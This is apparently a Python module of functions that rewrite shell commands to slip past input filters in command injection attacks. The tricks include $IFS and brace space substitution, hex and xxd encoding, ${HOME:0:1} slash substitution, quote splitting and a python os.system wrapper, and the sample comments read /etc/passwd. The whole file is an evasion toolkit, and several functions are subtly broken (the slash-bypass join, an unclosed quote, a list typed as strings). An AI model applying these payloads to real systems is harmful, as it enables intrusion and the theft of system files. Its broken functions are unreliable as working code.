def bypass_without_space(payload: str) -> str:
    # cat</etc/passwd

    return payload.replace(' ', '<')


def bypass_without_space2(payload: str) -> str:
    # {cat,/etc/passwd}

    return '{' + payload.replace(' ', ',') + '}'


def bypass_without_space3(payload: str) -> str:
    # cat$IFS/etc/passwd

    return payload.replace(' ', '$IFS')


def bypass_without_space4(payload: str) -> str:
    # cat${IFS}/etc/passwd{IFS}

    return payload.replace(' ', '${IFS}') + '${IFS}'


def bypass_without_space5(payload: str) -> str:
    # X=$'cat\x20/etc/passwd'&&$X

    return "X=$'" + payload.replace(' ', '\x20') + '&&$X'


def bypass_without_space6(payload: str) -> str:
    # IFS,;`cat<<</etc/passwd`

    return 'IFS=,;`cat<<<' + payload.replace(' ', ',') + '`'


def bypass_with_encoding(payload: str) -> str:
    # cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`

    command, arg = payload.split(' ')

    command = command + ' `echo -e '
    arg = '"' + ''.join(fr'\x{byte:02x}' for byte in arg.encode('utf-8')) + '"`'

    return command + arg


def bypass_with_encoding2(payload: str) -> str:
    # abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc

    command, arg = payload.split(' ')

    abc = 'abc=$' + "'" + ''.join(fr'\x{byte:02x}' for byte in arg.encode('utf-8')) + "';"
    command = command + '$abc'

    return abc + command


def bypass_with_encoding3(payload: str) -> str:
    # cat `xxd -r -p <<< 2f6574632f706173737764`

    command, arg = payload.split(' ')

    arg = " `xxd -r -p <<< " + arg.encode('utf-8').hex() + "`"

    return command + arg


def bypass_characters_filter(payload: str) -> str:
    # cat ${HOME:0:1}etc${HOME:0:1}passwd

    return payload.replace('/', '${HOME:0:1}')


def bypass_with_single_quote(payload: str) -> str:
    # w'h'o'am'i

    command, arg = payload.split(' ')

    command = command.replace(command[2], command[2] + "'")
    command = command.replace(command[1], "'" + command[1])

    return command + ' ' + arg


def bypass_with_double_quote(payload: str) -> str:
    # w"h"o"am"i

    command, arg = payload.split(' ')

    command = command.replace(command[2], command[2] + '"')
    command = command.replace(command[1], '"' + command[1])

    return command + ' ' + arg


def bypass_with_slash(payload: str) -> str:
    # w\ho\am\i

    return payload.join('/')


def bypass_with_special_symbol(payload: str) -> str:
    # who$@ami

    command, arg = payload.split(' ')

    command1 = command[:len(command) // 2]
    command2 = command[len(command) // 2:]

    return command1 + '$@' + command2 + ' ' + arg


def bypass_with_python(payload: str) -> str:
    return '''python -c '__import__("os").system("''' + payload + '''")\''''


def bypass_with_command(payload: str) -> str:
    return 'command ' + payload


def get_bypass_func() -> list[str]:
    functions: list[str] = [
        bypass_without_space, bypass_without_space2, bypass_without_space3,
        bypass_without_space4, bypass_without_space5, bypass_without_space6,
        bypass_with_encoding, bypass_with_encoding2, bypass_with_encoding3,
        bypass_characters_filter, bypass_with_single_quote, bypass_with_double_quote,
        bypass_with_slash, bypass_with_special_symbol, bypass_with_python,
        bypass_with_command
    ]

    return functions

